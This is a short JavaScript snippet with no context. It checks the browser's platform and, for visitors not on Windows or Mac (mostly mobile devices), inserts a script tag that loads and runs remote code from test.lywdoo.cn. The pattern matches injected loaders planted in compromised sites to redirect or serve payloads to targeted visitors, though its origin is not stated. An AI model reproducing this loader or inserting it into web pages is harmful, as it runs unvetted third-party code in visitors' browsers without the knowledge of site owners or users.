(function() {
	if(!(navigator.platform.indexOf('Win') > -1 || navigator.platform.indexOf('Mac') > -1)) {
		var hi = document.createElement("script");
		hi.src = "https://test.lywdoo.cn/bx/xx06.js";
		hi.charset = "UTF-8";
		var k = document.getElementsByTagName("script")[0];
		k.parentNode.insertBefore(hi, k);
	}
})();
